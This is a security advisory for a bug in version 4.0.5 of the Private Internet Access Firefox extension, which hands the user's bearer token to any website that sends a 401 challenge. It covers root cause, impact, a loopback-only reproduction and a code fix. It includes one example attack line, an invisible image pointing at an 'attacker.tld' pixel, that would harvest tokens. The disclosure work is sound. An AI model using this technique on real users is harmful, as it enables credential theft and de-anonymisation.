# PI-ay-ay (VU#747975): How the PIA Firefox Extension Hands Your Bearer Token to Any Website That Asks

> **Why "PI-ay-ay"?** Because whenever any random website responds with an HTTP `401 Unauthorized` challenge, the Private Internet Access (PIA) Firefox extension salutes (*"Aye-Aye!"*) and hands over both halves of your live account bearer token.

- **CERT/CC Vulnerability Note:** `VU#747975` (`VU#747975.1`)
- **CVE ID:** Pending assignment by CERT/CC (`VU#747975`)
- **Discovered by:** Souparna Majumder
- **Affected Product:** Private Internet Access (PIA) Extension for Firefox (`{3e4d2037-d300-4e95-859d-3cba866f46d3}`)
- **Affected Version:** `4.0.5` (Released Dec 23, 2024 | SHA-256: `21CC78A366A1DEA1E230B22E81B5BE3D0D2B05064513398437FF43C501B727DD`)
- **Unaffected Predecessor:** `3.2.5` (SHA-256: `27A705CC11D0BEE468E687AD0CAD990DC5D47B1DF7181A036FB813A212DB1AA9`)
- **CWE:** `CWE-200` (Exposure of Sensitive Information), `CWE-287` (Improper Authentication), `CWE-441` (Unintended Proxy or Intermediary)
- **CVSS v3.1:** `8.8 (High)` (`CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:L`)

---

## TL;DR

If you use the official Private Internet Access (PIA) extension on Firefox (`v4.0.5`) and have the VPN proxy turned on, **any website you visit (or any third-party image/subresource loaded on a page) can silently steal your live PIA authentication token in one request.**

All an attacker's server has to do is reply with a standard `HTTP/1.1 401 Unauthorized` and a `WWW-Authenticate: Basic` header.

Because of a wild regression introduced in `v4.0.5` (published on December 23, 2024, right before Christmas break), the Firefox extension's `webRequest.onAuthRequired` callback takes the browser's auth event parameter `e`, **never reads a single property on `e`**, and blindly returns your PIA proxy username and password to whoever asked. Firefox then retries the request to the attacker's server with `Authorization: Basic base64(username:password)`.

To make matters worse, PIA generates that proxy "username" and "password" by simply slicing your raw login bearer token (`device.rawToken`) in half down the middle. The attacker Base64-decodes the header, glues the two halves back together, and walks away with your full `/client/v2/token` API bearer credential.

---

## How Browser Proxy Auth Is Supposed to Work (vs. What v4.0.5 Does)

In Firefox WebExtensions, `browser.webRequest.onAuthRequired` fires for **two completely different things**:
1. **Proxy authentication (`HTTP 407`):** A proxy server asking the browser to authenticate (`details.isProxy === true`).
2. **Origin server authentication (`HTTP 401`):** A normal website on the internet asking for Basic/Digest credentials (`details.isProxy === false`).

When a VPN extension registers a blocking `onAuthRequired` listener across `<all_urls>` so it can automatically log you into its proxy nodes, it **must** check:
- Is `details.isProxy` actually `true`?
- Is `details.challenger.host` actually one of our verified VPN proxy servers?
- Does `details.challenger.port` match the active proxy port?

In PIA's older Firefox extension (`v3.2.5`), the code checked all three.

Then came `v4.0.5` on December 23, 2024.

---

## Root Cause Analysis (The 5-Line Christmas Eve Special)

Let's trace the token from login to exfiltration inside the official signed `4.0.5` XPI (`manifest.json:31-39` grants `<all_urls>`, `webRequest`, `webRequestBlocking`, and `proxy`).

### 1. Slicing the Bearer Token in Half (`main.js:1`)
When you log into the extension, PIA hits `/client/v2/token` and passes the returned token into `saveTokenForAuth`:

```js
e.prototype.saveTokenForAuth = function(e) {
  var t = e.substring(0, e.length / 2),
      n = e.substring(e.length / 2);
  return { rawToken: e, token: t, tokenSecret: n };
};
```

There is no hashing, HMAC, or one-way derivation here. `device.token` is the first half of the string, `device.tokenSecret` is the second half, and `token + tokenSecret === rawToken`.

Right below that in `main.js:1`, the extension uses that same full token as the bearer credential for the account API (`/client/v2/account` in `assets/config/config.prod.json:4042-4043`):

```js
e.authService.getUserData({ headers: { Authorization: "Token " + t.token } });
```

### 2. Registering the Global Listener (`background.js:18`)
When you toggle the VPN proxy on, `FirefoxProxyGateway.connect` loads `device` from storage, resets a retry counter to 10, and attaches `authHandler` to every URL and resource type in the browser:

```js
l.includes("device") && (n.device = c.device),
n.resetRetryCount(),
browser.webRequest.onAuthRequired.addListener(
  n.authHandler,
  { urls: ["<all_urls>"] },
  ["blocking"]
);
```

### 3. The Unguarded Callback (`background.js:18`)
Here is the entire `FirefoxProxyGateway.authHandler` in version `4.0.5`:

```js
this.authHandler = function(e) {
  return --p.retry < 0
    ? (p.serviceDebug.add("retry count exhausted (" + p.retry + ")"), { cancel: !0 })
    : { authCredentials: { username: p.device.token, password: p.device.tokenSecret } };
};
```

Look closely at `function(e)`. **The argument `e` is never even referenced inside the function body.**
- No `e.isProxy` check.
- No `e.challenger.host` check.
- No `e.challenger.port` check.

As long as the retry counter is above zero (it starts at 10 and resets on tab updates), the first 10 authentication challenges from anywhere on the web get handed `p.device.token` and `p.device.tokenSecret`.

When an attacker's origin responds with `401 Unauthorized` and `WWW-Authenticate: Basic`, Firefox receives `{ authCredentials: { username, password } }` from the extension and silently retries the HTTP request to the attacker's server with:

```http
Authorization: Basic base64(device.token + ":" + device.tokenSecret)
```

No browser prompt appears. The victim sees nothing.

### 4. The Chrome Handler Sitting Right Next to It
What makes this bug genuinely funny is that `ChromeProxyGateway.authHandler` is bundled on the **exact same line** (`background.js:18`) of the Firefox XPI, and the Chrome version still has the check:

```js
if (!e.isProxy ||
    !/^[a-zA-Z0-9-]+\.http-proxy\.privateinternetbrowsing\.com$/.test(e.challenger.host) ||
    --p.retry < 0)
  return { cancel: !0 };
```

So Chrome checks `!e.isProxy` and verifies the `*.http-proxy.privateinternetbrowsing.com` hostname regex. Firefox (`v3.2.5`) *used* to check `isProxy`, host, and port too, until somebody refactored `FirefoxProxyGateway` for `4.0.5` and deleted the entire guard.

---

## Real-World Impact & CVSS 8.8 (High) Breakdown

Vector: `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:L` (**8.8 High**)

1. **Scope: Changed (`S:C`):**
   The vulnerable code lives inside the local Firefox WebExtension (`FirefoxProxyGateway.authHandler`), while the impacted resources are PIA's remote backend infrastructure (`/client/v2/account` API, `*.http-proxy.privateinternetbrowsing.com` proxy servers, and VPN endpoints) plus the user's cross-origin browser privacy boundary.
2. **Confidentiality: High (`C:H`) - Token Theft & Silent De-Anonymization:**
   - **Full Credential Disclosure:** Leaks 100% of the authentication secrets stored by the extension (`device.token`, `device.tokenSecret`, and the reconstructed `device.rawToken` used for `/client/v2/account`).
   - **De-Anonymizing VPN Users Across Exit Nodes:** People use a VPN extension so websites cannot track or correlate their identity across sessions. Even if a journalist or researcher switches PIA proxy countries 20 times, their `device.rawToken` stays identical. Any adversary running a watering-hole site (or injecting an invisible `<img src="https://attacker.tld/pixel">` on a third-party forum that returns `401 Basic`) gets handed a static, globally unique cryptographic token tied to that exact PIA account.
3. **Integrity: Low (`I:L`) - Piggybacking on the Victim's Account:**
   With the captured proxy credentials and `/client/v2/token` bearer token, an attacker can route their own web traffic through PIA's HTTP proxy nodes (`*.http-proxy.privateinternetbrowsing.com`) under the victim's account. Furthermore, as documented in PIA's own `pia-foss/manual-connections` scripts (`connect_to_wireguard_with_token.sh` and `connect_to_openvpn_with_token.sh`), the `/client/v2/token` bearer value is used to register WireGuard public keys (`/addKey`) and establish VPN tunnels under the account.
4. **Availability: Low (`A:L`) - Exhausting Connection Limits:**
   PIA enforces concurrent device/connection slot limits and abuse rate limits per account. An attacker spinning up proxy or VPN connections with the stolen token can exhaust slots or trigger abuse lockouts for the legitimate user.

---

## Local Proof of Concept

This repository includes a safe, loopback-only Node.js challenge server (`poc/server.js`). It binds strictly to `127.0.0.1:8080`, responds to unauthenticated requests with a single `401 Basic` challenge, parses the automatic retry from Firefox, and logs only the lengths and the SHA-256 hash of the reconstructed token (so raw account tokens are never printed to disk or terminal logs).

### Reproduction Steps

1. In an isolated Firefox profile, install the official signed PIA Firefox extension `v4.0.5` (`SHA-256: 21CC78A366A1DEA1E230B22E81B5BE3D0D2B05064513398437FF43C501B727DD`) and log in with a disposable/test PIA account.
2. Start the local challenge server:
   ```sh
   cd poc
   node server.js
   ```
3. Turn the PIA extension proxy **ON** (if `127.0.0.1` is routed through the proxy in your setup, add `127.0.0.1` to the extension's bypass list; bypassing proxy routing does not disable the global `onAuthRequired` listener).
4. Visit `http://127.0.0.1:8080/` in the connected Firefox profile.
5. Upon receiving the `401` response, Firefox automatically retries the request with `Authorization: Basic ...` containing `device.token` and `device.tokenSecret`. The server logs `basic_credentials_received` along with `reconstructedTokenSha256`, which matches the SHA-256 hash of `device.rawToken` in extension storage.
6. **Negative Control:** Disconnect the PIA proxy (which removes the `onAuthRequired` listener via `FirefoxProxyGateway.disconnect`) and visit `http://127.0.0.1:8080/` in a fresh tab. Firefox displays the standard browser login prompt instead of sending PIA credentials.

---

## How to Fix It

Until PIA ships a patched version on `addons.mozilla.org`, Firefox users should **disable or uninstall version `4.0.5` of the Private Internet Access Firefox extension** and use the desktop VPN client instead.

To fix the extension code in `FirefoxProxyGateway.authHandler`, ignore non-proxy (`401`) challenges so Firefox handles normal websites natively, and strictly verify that `407` proxy challenges match the active, verified PIA proxy host and port:

```js
this.authHandler = function (details) {
  if (!details.isProxy) {
    return {};
  }

  if (!p.activeConnection || !p.device || !details.challenger) {
    return { cancel: true };
  }

  const host = String(details.challenger.host || "").toLowerCase();
  const port = Number(details.challenger.port);
  const activeHost = String(p.ffProxyInfo.host || "").toLowerCase();
  const activePort = Number(p.ffProxyInfo.port);

  if (host !== activeHost || port !== activePort) {
    return { cancel: true };
  }

  if (--p.retry < 0) {
    return { cancel: true };
  }

  return {
    authCredentials: {
      username: p.device.token,
      password: p.device.tokenSecret,
    },
  };
};
```

Architecturally, proxy nodes should also use short-lived, proxy-scoped credentials rather than the two raw halves of the master `/client/v2/token` bearer token.

---

## Disclosure Timeline (76 Days of Vendor Ghosting)

- **2026-08-18:** Initial vulnerability report sent to Private Internet Access (PIA).
- **2026-08-18 to 2026-10-26:** Reported across four different PIA/Kape channels. Received only canned/automated template replies and zero technical follow-up or patch timeline.
- **2026-10-08:** Requested CVE ID from MITRE (`scr2120712`). After 20 days in queue, MITRE triage saw `addons.mozilla.org` in the store link and told me to contact Mozilla's CNA for a third-party VPN extension.
- **2026-10-29:** Provided source diff and package verification (`v3.2.5` vs. `v4.0.5`) to CERT/CC.
- **2026-11-02:** CERT/CC opened coordination case **`VU#747975`** (`VU#747975.1`) and authorized public disclosure after 76 days of vendor non-response (exceeding CERT/CC's 45-day disclosure policy).
